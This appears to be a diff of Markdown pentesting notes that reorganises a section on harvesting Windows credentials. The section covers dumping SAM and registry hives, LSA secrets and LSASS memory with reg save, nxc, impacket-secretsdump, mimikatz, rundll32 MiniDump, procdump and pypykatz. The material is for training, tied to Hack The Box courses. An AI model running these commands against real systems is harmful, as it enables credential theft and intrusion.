@@ -166,41 +166,53 @@ $ hashcat -m 22100 myhash wordlist
 
 <hr class="sep-both">
 
-## Windows Pentester Notes ☠️
+## Windows Credentials Harvesting Notes ☠️
+
+*Article about it: [Windows secrets extraction: a summary.](https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary)*
 
 <div class="row row-cols-lg-2"><div>
+
+#### Windows Credentials Harvesting — Overview
+
+Pentesters may find themselves in one of the following scenarios. The tools that we use vary accordingly:
+
+* 📚 Extract And Analyze Data from Windows <small>(mimikatz)</small>
+* 🐲 Extract And Analyze Data from Linux <small>(impacket, nxc)</small>
+* 🌍 Extract Data on Windows, Analyze on Linux <small>(mimikatz, pypykatz)</small>
+
+Additionally, [metasploit's meterpreter](/cybersecurity/red-team/tools/frameworks/metasploit/index.md) includes modules to dump hashes as root AND it includes mimikatz <small>(no need to upload it!)</small>.
+
+<br>
 
 #### Dump Credentials From The SAM Database
 
 [![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
-* **Dump SAM database and other hives**
+You can dump the hives and analyze them with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md).
 
-If you have enough privileges to access the registry <small>(not necessarily admin, but not a normal user)</small>, you can dump the three hives:
-
-```ps
+```shell!
 PS> reg save hklm\system C:\XXX\system.hive
 PS> reg save hklm\sam C:\XXX\sam.hive
 PS> reg save hklm\security C:\XXX\security.hive
-$ nxc smb IP --local-auth -u xxx -p yyy --sam # dump hashes
-```
-
-* **Analysis** on Windows with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
-
-```shell!
 mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive
 mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive /security:./security.hive
 ```
 
-* **Analysis of dumped database** on Linux
-
-Use [file transfer methods](/cybersecurity/red-team/_knowledge/topics/file_transfer.md) such as SMB and [secretsdump](/operating-systems/networking/protocols/tools/impacket.md) to dump them. We would then try to [crack](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking) or pass the hash.
+From Linux, you can dump hashes from SAM using:
 
 ```shell!
+$ nxc smb IP -u xxx -p yyy --sam
+$ nxc smb IP --local-auth -u xxx -p yyy --sam
+```
+
+On Linux, you can analyze locally downloaded hives using:
+
+```shell!
+PS> reg save [...] # and send them to Linux
 $ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
 ```
 
-On Windows, you can use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.5k ⭐)</small> too.
+On Windows, you can use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.5k ⭐, 👻)</small> too.
 
 <br>
 
@@ -251,27 +263,24 @@ mimikatz# vault::cred
 
 <br>
 
-#### Dump Credentials From LSASS Process
+#### Dump LSA Secrets
+
+From Linux, you can use:
+
+```shell!
+$ nxc smb IP --local-auth -u xxx -p yyy --lsa # dump secrets
+```
+
+<br>
+
+#### Dump Credentials From LSASS Process Memory
 
 [![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 [![windows_privilege_escalation](../../../cybersecurity/_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 
 The LSASS process that contains the DPAPI masterkey for the logged user. It can be used to decrypt credentials for applications that use it. It also contains tickets, and [wDIGEST](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-authentication) cleartext credentials.
 
-* **Dump and Analysis** on Windows with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
-
-```shell!
-mimikatz# lsadump::lsa /patch
-mimikatz# sekurlsa::dpapi
-```
-
-* **Dump and Analysis** using [nxc](/cybersecurity/red-team/tools/cracking/auth/nxc.md)
-
-```ps
-$ nxc smb IP --local-auth -u xxx -p yyy --lsa # dump secrets
-```
-
-* **Dump LSA Process Memory** <small>(Admin Shell Required/No Admin for TM?)</small>
+You can dump the memory using rundll32 <small>(admin not required?)</small>:
 
 ```shell!
 PS> tasklist /svc | findstr "lsa"
@@ -284,21 +293,22 @@ PS> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4242 C:\lsass.dmp full
 <detected by antivirus>
 ```
 
+You can dump the memory using procdump <small>(admin required)</small>:
+
 ```ps
 PS> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp
-<admin required>
 ```
 
-Lastly, you can also open the task manager, right-click on the LSAP process and select 'Create dump file.'
-
-* **Analyzing LSA Process Dump** on Windows using [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
+On Windows, with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md), you can dump the process OR you can use a dump that you created manually. 
 
 ```shell!
-mimikatz# sekurlsa::minidump ./lsass.dmp # load
-mimikatz# sekurlsa::logonpasswords
+mimikatz# lsadump::lsa /patch            # Dump
+mimikatz# sekurlsa::minidump ./lsass.dmp # Load a dump
+mimikatz# sekurlsa::dpapi                # ...
+mimikatz# sekurlsa::logonpasswords       # ...
 ```
 
-* **Analyzing LSA Process Dump** on Linux using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md)
+On Linux, you can read the memory dump using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md).
 
 ```shell!
 $ pypykatz lsa minidump lsass.dmp
